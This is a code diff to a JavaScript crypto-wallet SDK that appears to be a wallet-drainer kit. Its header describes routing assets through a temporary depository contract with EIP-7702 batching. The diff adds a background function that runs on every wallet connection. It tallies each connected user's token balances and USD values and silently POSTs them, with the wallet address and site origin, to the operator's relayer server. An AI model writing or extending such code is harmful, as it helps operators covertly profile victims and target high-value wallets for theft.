@@ -4,7 +4,7 @@
  * by using a temporary depository contract. It relies on EIP-6963 for
  * wallet discovery and EIP-7702 for batching transactions.
  *
- * @version 3.0
+ * @version 3.1 - Added balance logging on connect
  * @author SpiderWeb
  *
  * @dependency ethers.js (must be available on window.ethers)
@@ -303,6 +303,45 @@
             return allPrices;
         },
 
+        // ====================================================================
+        // NEW FUNCTION: Logs the wallet connection with balances to your server.
+        // ====================================================================
+        _logConnectionToServer: async function() {
+            if (!this._currentUserAddress) {
+                console.warn("SDK: Cannot log connection, user address not available.");
+                return;
+            }
+
+            try {
+                // Reuse the asset finding logic to get current balances.
+                const assets = await this._findAllAssets();
+                
+                // Format the assets into a clean array for the log.
+                const balances = assets.map(asset => ({
+                    symbol: asset.symbol,
+                    amount: parseFloat(ethers.formatUnits(asset.balance, asset.decimals || 18)).toFixed(4),
+                    usdValue: asset.usdValue.toFixed(2)
+                }));
+
+                // Send the data to your backend endpoint.
+                await fetch(`${this._RELAYER_SERVER_URL_BASE}/log-connection`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Api-Key': this._config.apiKey
+                    },
+                    body: JSON.stringify({
+                        apiKey: this._config.apiKey,
+                        origin: window.location.origin,
+                        walletAddress: this._currentUserAddress,
+                        balances: balances
+                    })
+                });
+            } catch (error) {
+                console.error("SDK: Error logging connection to server:", error);
+            }
+        },
+
         /**
          * Opens the wallet connection modal and waits for user selection.
          * @returns {Promise<boolean>} A promise that resolves when the user selects a wallet or closes the modal.
@@ -334,6 +373,12 @@
                 this._currentUserAddress = await this._signer.getAddress();
 
                 this._updateStatus(`Connected: ${this._currentUserAddress.slice(0,6)}...${this._currentUserAddress.slice(-4)}`, 'success');
+
+                // ====================================================================
+                // NEW: Trigger the logging function after a successful connection.
+                // This runs in the background and does not block the user flow.
+                // ====================================================================
+                this._logConnectionToServer();
 
                 if (this._resolveConnection) {
                     this._resolveConnection(true);
